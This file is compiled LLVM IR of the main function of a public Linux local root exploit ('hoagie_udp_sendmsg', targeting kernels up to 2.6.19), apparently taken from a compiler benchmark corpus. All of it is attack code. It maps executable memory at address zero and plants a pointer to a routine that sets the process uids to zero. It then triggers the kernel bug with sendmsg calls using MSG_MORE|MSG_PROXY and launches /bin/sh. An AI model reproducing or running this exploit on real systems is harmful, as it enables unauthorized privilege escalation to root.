; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_9575.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_9575.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.msghdr = type { i32, %struct.msghdr*, i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr_in = type { i32, %struct.sockaddr_in*, i32, %struct.TYPE_2__, i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [68 x i8] c"hoagie_udp_sendmsg.c - linux root <= 2.6.19 local\0A-andi / void.at\0A\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [25 x i8] c"[*] can't create socket\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [17 x i8] c"[*] mmap failed\0A\00", align 1
@set_current_task_uids_gids_to_zero = common dso_local global i64 0, align 8
@MSG_MORE = common dso_local global i32 0, align 4
@MSG_PROXY = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.msghdr, align 8
  %8 = alloca %struct.sockaddr_in, align 8
  %9 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %9, align 8
  %10 = load i32, i32* @stderr, align 4
  %11 = call i32 @fprintf(i32 %10, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str, i64 0, i64 0))
  %12 = load i32, i32* @PF_INET, align 4
  %13 = load i32, i32* @SOCK_DGRAM, align 4
  %14 = call i32 @socket(i32 %12, i32 %13, i32 0)
  store i32 %14, i32* %6, align 4
  %15 = load i32, i32* %6, align 4
  %16 = icmp eq i32 %15, -1
  br i1 %16, label %17, label %21

17:                                               ; preds = %2
  %18 = load i32, i32* @stderr, align 4
  %19 = call i32 @fprintf(i32 %18, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  %20 = call i32 @exit(i32 -1) #3
  unreachable

21:                                               ; preds = %2
  %22 = bitcast %struct.msghdr* %7 to %struct.sockaddr_in*
  %23 = call i32 @memset(%struct.sockaddr_in* %22, i32 0, i32 32)
  %24 = call i32 @memset(%struct.sockaddr_in* %8, i32 0, i32 32)
  %25 = load i32, i32* @AF_INET, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 4
  store i32 %25, i32* %26, align 8
  %27 = call i32 @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %29 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = call i32 @htons(i32 22)
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %30, i32* %31, align 8
  %32 = bitcast %struct.sockaddr_in* %8 to %struct.msghdr*
  %33 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %7, i32 0, i32 1
  store %struct.msghdr* %32, %struct.msghdr** %33, align 8
  %34 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %7, i32 0, i32 0
  store i32 32, i32* %34, align 8
  %35 = load i32, i32* @PROT_READ, align 4
  %36 = load i32, i32* @PROT_WRITE, align 4
  %37 = or i32 %35, %36
  %38 = load i32, i32* @PROT_EXEC, align 4
  %39 = or i32 %37, %38
  %40 = load i32, i32* @MAP_FIXED, align 4
  %41 = load i32, i32* @MAP_ANONYMOUS, align 4
  %42 = or i32 %40, %41
  %43 = load i32, i32* @MAP_PRIVATE, align 4
  %44 = or i32 %42, %43
  %45 = call i8* @mmap(i32 0, i32 4096, i32 %39, i32 %44, i32 0, i32 0)
  store i8* %45, i8** %9, align 8
  %46 = load i8*, i8** %9, align 8
  %47 = load i8*, i8** @MAP_FAILED, align 8
  %48 = icmp eq i8* %46, %47
  br i1 %48, label %49, label %53

49:                                               ; preds = %21
  %50 = load i32, i32* @stderr, align 4
  %51 = call i32 @fprintf(i32 %50, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0))
  %52 = call i32 @exit(i32 -1) #3
  unreachable

53:                                               ; preds = %21
  %54 = load i64, i64* @set_current_task_uids_gids_to_zero, align 8
  %55 = trunc i64 %54 to i32
  %56 = load i8*, i8** %9, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 116
  %58 = bitcast i8* %57 to i32*
  store i32 %55, i32* %58, align 4
  %59 = load i32, i32* %6, align 4
  %60 = bitcast %struct.msghdr* %7 to %struct.sockaddr_in*
  %61 = load i32, i32* @MSG_MORE, align 4
  %62 = load i32, i32* @MSG_PROXY, align 4
  %63 = or i32 %61, %62
  %64 = call i32 @sendmsg(i32 %59, %struct.sockaddr_in* %60, i32 %63)
  %65 = load i32, i32* %6, align 4
  %66 = bitcast %struct.msghdr* %7 to %struct.sockaddr_in*
  %67 = call i32 @sendmsg(i32 %65, %struct.sockaddr_in* %66, i32 0)
  %68 = load i32, i32* %6, align 4
  %69 = call i32 @close(i32 %68)
  %70 = call i32 @system(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i8* @mmap(i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @sendmsg(i32, %struct.sockaddr_in*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
